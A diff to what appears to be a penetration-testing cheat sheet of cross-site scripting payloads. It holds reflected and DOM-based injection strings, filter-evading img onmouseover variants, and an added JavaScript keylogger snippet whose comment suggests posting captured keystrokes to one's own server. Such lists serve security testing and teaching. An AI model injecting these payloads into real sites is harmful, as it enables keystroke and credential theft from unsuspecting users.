@@ -82,7 +82,7 @@ or change something
  
  ####  Reflected XSS
  ```
- <script>alert("hello")</script>
+ <script>alert("Hello")</script>
  <script>alert(window.location.hostname)</script>
  ```
  #### DOM-Based XSS
@@ -90,3 +90,19 @@ or change something
  test" onmouseover="alert('test')
  test" onmouseover="document.body.style.backgroundColor='red'
  ```
+#### Keylogger
+
+```
+ <script type="text/javascript">
+ let l = ""; // Variable to store key-strokes in
+ document.onkeypress = function (e) { // Event to listen for key presses
+   l += e.key; // If user types, log it to the l variable
+   console.log(l); // update this line to post to your own server
+ }
+</script> 
+```
+
+<img SRC="test" onmouseover=alert('Hello') />
+<img SRC="test" onmouseover=confirm('Hello') />
+<img SRC="test" onmouseover=alert('HHelloello') />
+<img SRC="test" ONMOUSEOVER=alert('HHelloello') />
